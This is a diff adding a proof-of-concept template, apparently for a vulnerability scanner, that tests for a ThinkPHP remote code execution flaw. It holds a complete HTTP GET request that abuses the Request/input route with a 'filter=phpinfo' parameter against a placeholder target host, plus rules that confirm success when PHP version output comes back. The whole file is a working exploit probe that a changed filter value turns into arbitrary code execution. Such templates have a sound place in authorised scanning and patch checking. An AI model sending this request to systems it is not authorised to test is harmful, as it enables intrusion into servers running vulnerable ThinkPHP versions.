@@ -1,0 +1,14 @@
+﻿<DudePoc_Name>thinkphp_request_input_rce</DudePoc_Name>
+<DudePoc_Description></DudePoc_Description>
+<DudePoc_SetHeader>
+GET /index.php?s=index/%5Cthink%5CRequest/input&filter=phpinfo&data=1 HTTP/1.1
+Host: $<AttackHost>$
+User-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.57
+</DudePoc_SetHeader>
+<DudePoc_SetData>
+
+</DudePoc_SetData>
+<DudePoc_VerifyStatusCode>200</DudePoc_VerifyStatusCode>
+<DudePoc_VerifyData>^(?=.*?(?:PHP|Version)).*?$</DudePoc_VerifyData>
+<DudePoc_VerifyFile></DudePoc_VerifyFile>
+<DudePoc_AttackCode></DudePoc_AttackCode>
